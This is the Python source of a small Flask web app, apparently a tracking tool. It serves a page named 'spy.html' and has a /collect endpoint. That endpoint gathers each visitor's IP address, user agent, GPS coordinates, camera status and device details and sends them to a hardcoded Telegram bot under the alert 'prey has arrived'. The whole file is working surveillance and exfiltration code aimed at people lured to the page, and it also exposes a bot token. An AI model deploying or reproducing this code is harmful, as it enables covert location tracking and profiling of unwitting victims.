from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

# Telegram Bot Info
BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"

@app.route('/')
def index():
    return render_template("spy.html")

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    camera = data.get("camera", "❌ Unknown")
    device_info = data.get("deviceInfo", "Unknown")

    location_url = f"https://www.google.com/maps?q={latitude},{longitude}" if latitude and longitude else "Location Not Shared"

    message = f"""
👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device Info: {user_agent}
📍 Location: {location_url}
📷 Camera: {camera}
🧠 Raw Data: {data}
    """

    # Send to Telegram
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
        "chat_id": CHAT_ID,
        "text": message
    })

    return "OK", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
